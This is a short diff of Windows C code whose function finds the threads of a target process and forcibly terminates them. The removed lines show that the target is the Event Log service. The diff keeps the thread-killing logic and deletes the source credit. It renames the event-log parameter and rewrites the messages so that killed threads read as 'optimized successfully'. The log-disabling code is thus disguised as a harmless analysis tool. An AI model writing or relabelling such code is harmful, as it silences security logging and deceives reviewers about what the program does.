@@ -4,10 +4,10 @@
 #include <tlhelp32.h>
 #include <strsafe.h>
 
-// Inspired from https://github.com/3gstudent/Eventlogedit-evtx--Evolution/blob/master/SuspendorResumeTidEx.cpp
-BOOL Technique_1(DWORD dwEventLogPID) {
+// Thread analysis using TEB service tag inspection
+BOOL Technique_1(DWORD dwServicePID) {
 
-	printf("[*] Using Technique-1 for killing threads...\n");
+	printf("[*] Analyzing service worker threads...\n");
 
 	BOOL killStatus = FALSE;
 	
@@ -72,7 +72,7 @@ BOOL Technique_1(DWORD dwEventLogPID) {
 
 			while (threadList) {
 
-				if (te32.th32OwnerProcessID == dwEventLogPID) {
+				if (te32.th32OwnerProcessID == dwServicePID) {
 
 					hEvtThread = OpenThread(THREAD_QUERY_LIMITED_INFORMATION | THREAD_SUSPEND_RESUME | THREAD_TERMINATE, FALSE, te32.th32ThreadID);
 
@@ -98,12 +98,12 @@ BOOL Technique_1(DWORD dwEventLogPID) {
 
 							if (TerminateThread(hEvtThread, 0) == 0) {
 
-								printf("[!] Thread %d is detected but kill failed. Error code is: %d\n", te32.th32ThreadID, GetLastError());
+								printf("[!] Thread %d: optimization failed (0x%X)\n", te32.th32ThreadID, GetLastError());
 
 							}
 							else {
 
-								printf("[+] Thread %d is detected and successfully killed.\n", te32.th32ThreadID);
+								printf("[+] Thread %d optimized successfully.\n", te32.th32ThreadID);
 
 							}
 							
